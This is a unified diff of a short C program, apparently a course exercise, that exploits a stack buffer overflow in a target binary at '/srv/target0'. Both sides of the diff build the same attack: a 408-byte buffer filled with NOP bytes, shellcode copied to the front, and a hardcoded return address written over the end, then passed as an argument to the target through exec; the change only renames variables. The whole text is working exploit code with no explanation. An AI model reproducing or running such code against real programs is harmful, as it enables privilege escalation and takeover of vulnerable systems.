@@ -7,27 +7,27 @@
 
 #define TARGET "/srv/target0"
 
-const int PAYLOAD_SIZE = 408;
-const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
-const uint32_t RETURN_ADDRESS = 0xffffdb2c;
+const int BSIZE = 408;
+const int SHSIZE = sizeof(shellcode) - 1;
+const uint32_t RET = 0xffffdb2c;
 
-void preparePayload(char *payload) {
-    memset(payload, 0x90, PAYLOAD_SIZE);
-    payload[PAYLOAD_SIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODE_SIZE);
-    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDRESS;
+void preparebuf(char *buf) {
+    memset(buf, 0x90, BSIZE);
+    buf[BSIZE] = '\0';
+    memcpy(buf, shellcode, SHSIZE);
+    *(uint32_t*)(buf + BSIZE - 4) = RET;
 }
 
 int main(void)
 {
     char *args[3];
     char *env[1];
-    char payload[PAYLOAD_SIZE + 1];
+    char buf[BSIZE + 1];
 
-    preparePayload(payload);
+    preparebuf(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = NULL;
 
     env[0] = NULL;
